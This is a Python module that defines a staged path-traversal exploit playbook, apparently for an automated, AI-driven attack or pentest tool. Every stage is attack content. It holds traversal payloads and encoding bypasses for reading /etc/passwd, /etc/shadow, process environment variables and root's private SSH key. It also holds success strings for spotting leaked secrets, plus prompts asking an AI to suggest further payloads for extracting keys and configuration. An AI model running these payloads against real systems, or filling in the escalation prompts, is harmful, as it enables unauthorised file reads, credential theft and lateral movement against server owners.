from . import Playbook, ExploitStage, PayloadEntry

path_traversal_playbook = Playbook(
    vuln_type="path_traversal",
    description="Exploits path traversal or arbitrary file read vulnerabilities.",
    stages=[
        ExploitStage(
            name="boundary_testing",
            description="Test basic traversal patterns to confirm path validation gaps.",
            payloads=[
                PayloadEntry("../../etc/passwd", "Basic traversal. Tests if no path validation."),
                PayloadEntry("..%2F..%2Fetc%2Fpasswd", "URL-encoded traversal. Tests decoding bypass."),
                PayloadEntry("....//....//etc/passwd", "Double-dot bypass. Tests if server strips '../' only once."),
                PayloadEntry("/etc/passwd", "Tests if absolute paths are allowed directly.")
            ],
            success_indicators=["root:x:0:0", "daemon:x:"],
            failure_indicators=["File not found", "No such file", "Permission denied", "Invalid path"],
            next_stage_on_success="escalation",
            ai_escalation_prompt="The server is vulnerable to path traversal. Suggest payloads to extract configuration files, SSH keys, or environment variables."
        ),
        ExploitStage(
            name="escalation",
            description="Escalate finding by extracting sensitive files.",
            payloads=[
                PayloadEntry("../../etc/shadow", "Attempt to read password hashes (requires root access)."),
                PayloadEntry("../../proc/self/environ", "Extract environment variables (may contain secrets)."),
                PayloadEntry("../../root/.ssh/id_rsa", "Extract root SSH key for lateral movement.")
            ],
            success_indicators=["BEGIN OPENSSH PRIVATE KEY", "PATH=", "PWD="],
            failure_indicators=["Permission denied"],
            next_stage_on_success="impact_demo",
            ai_escalation_prompt="Suggest operating-specific sensitive files to read to prove critical impact."
        ),
        ExploitStage(
            name="impact_demo",
            description="Demonstrate maximum impact.",
            payloads=[],
            success_indicators=[],
            failure_indicators=[],
            next_stage_on_success=None,
            ai_escalation_prompt="Generate final confirmation payloads."
        )
    ]
)
